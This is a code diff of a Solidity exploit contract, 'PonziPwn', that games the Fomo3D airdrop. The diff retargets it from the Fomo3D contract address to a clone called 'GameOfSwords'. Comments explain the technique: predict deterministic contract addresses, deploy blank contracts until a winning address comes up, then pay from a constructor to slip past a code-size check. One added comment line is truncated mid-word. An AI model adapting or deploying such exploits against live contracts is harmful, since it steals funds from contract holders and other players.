@@ -1,9 +1,9 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PonziPwn at 0x3b9dc0e353b7bc689893a87cd697f08e06feee81
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PonziPwn at 0xfb5cdd172bdc206020797a43278fe1bf9bf7496e
 */
 pragma solidity ^0.4.24;
 
-interface FoMo3DlongInterface {
+interface GameOfSwordsInterface {
     function airDropTracker_() external returns (uint256);
     function airDropPot_() external returns (uint256);
     function withdraw() external;
@@ -11,7 +11,7 @@ interface FoMo3DlongInterface {
 
 /* 
  * Contract addresses are deterministic. 
- * We find out how many deployments it'll take to get a winning contract address
+ * We find out how many deployments it'll take to get a winning contract a
  * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.
 */
 contract BlankContract {
@@ -21,7 +21,7 @@ contract BlankContract {
 //contract which will win the airdrop
 contract AirDropWinner {
     //point to Fomo3d Contract
-    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
+     GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);
     /*
      * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop
      * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender
@@ -38,7 +38,7 @@ contract AirDropWinner {
 }
 
 contract PonziPwn {
-    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
+    GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);
     
     address private admin;
     uint256 private blankContractGasLimit = 20000;
